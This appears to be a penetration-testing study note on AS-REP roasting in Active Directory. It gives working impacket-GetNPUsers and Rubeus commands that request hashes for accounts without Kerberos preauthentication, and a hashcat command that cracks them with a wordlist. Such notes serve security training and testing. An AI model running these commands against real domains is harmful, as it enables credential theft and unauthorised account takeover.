If the AD authentication is configured without the Kerberos Preauthentiction enabled, any user can request a TGT. We can use the `impacket-GetNPUsers` util on Kali. A good explaination of this attack can be found [here](https://en.hackndo.com/kerberos-asrep-roasting/).

```shell
impacket-GetNPUsers -dc-ip <IP-DC>  -request -outputfile hashes.asreproast corp.com/<USER>
```

AS-Rep roasting tickets (TGT) has this format: `$krb5asrep$23$`.

In the powershell the specular program is [Rubeus](https://github.com/GhostPack/Rubeus)

```powershell
.\Rubeus.exe asreproast /nowrap
```

In both cases we have to know at leas the password of one of the AD users. For this reason this and the following tecniques are **post-exploitation** attacks. When we gain the hash it can be cracked with hashcat.

```shell
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```